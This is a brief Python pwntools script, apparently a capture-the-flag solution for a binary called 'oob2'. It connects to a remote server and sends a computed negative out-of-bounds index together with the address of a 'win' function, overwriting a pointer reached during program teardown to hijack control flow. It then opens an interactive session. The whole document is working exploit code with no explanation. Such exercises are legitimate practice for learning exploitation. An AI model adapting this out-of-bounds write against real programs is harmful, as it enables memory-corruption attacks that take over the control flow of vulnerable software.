import pwn

gdb = """
    b *_dl_fini+441
    c
"""

p = pwn.remote("34.71.207.70",9337)
#p = pwn.process("./oob2")
#p = pwn.gdb.debug("./oob2",gdbscript = gdb)
arr = 0x403420
win = 0x4011d6
dist = 0x4031b0
index = int((-arr+dist)/4)
p.sendlineafter("index: ",str(index))
p.sendlineafter("value: ", str(win))
p.interactive()
